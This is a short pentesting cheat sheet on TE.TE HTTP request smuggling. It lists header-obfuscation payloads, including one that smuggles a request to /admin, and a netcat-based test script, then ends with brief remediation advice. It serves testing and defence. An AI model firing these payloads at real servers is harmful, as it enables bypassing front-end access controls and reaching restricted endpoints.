# TE.TE — Obfuscated Transfer-Encoding

## Summary
Both front-end and back-end support Transfer-Encoding, but they parse it differently. By obfuscating the Transfer-Encoding header, one server ignores it while the other processes it.

## Obfuscation Techniques

### Header Case Variations
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked
Transfer-encoding: x

0

GET /admin HTTP/1.1
Host: target.com
```

One server honours the first header, the other honours the second.

### Header Name Variations
```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

### Leading Whitespace
```http
Transfer-Encoding: chunked
 Transfer-Encoding: x
```

### Tab vs Space
```http
Transfer-Encoding: chunked
Transfer-Encoding:	x
```

### Header Value Obfuscation
```http
Transfer-Encoding: chunked
Transfer-Encoding: [space]x
Transfer-Encoding: x
```

### Double Header with Different Value
```http
Transfer-Encoding: x
Transfer-Encoding: chunked
```

One parser takes the first value ("x" — ignores TE), the other takes the last ("chunked" — processes TE).

## Detection

```bash
# Test TE.TE with double Transfer-Encoding header
{
  printf "POST / HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "Content-Length: 6\r\n"
  printf "Transfer-Encoding: chunked\r\n"
  printf "Transfer-encoding: x\r\n"
  printf "\r\n"
  printf "0\r\n"
  printf "\r\n"
  printf "GET /404 HTTP/1.1\r\n"
  printf "Host: target.com\r\n"
  printf "\r\n"
} | nc -w 5 target.com 80
```

Try multiple obfuscation variants if the first does not work.

## Remediation
- Normalise Transfer-Encoding headers at the proxy layer — keep only the first or last
- Reject requests with multiple Transfer-Encoding headers
- Use strict header parsing to reject malformed header names
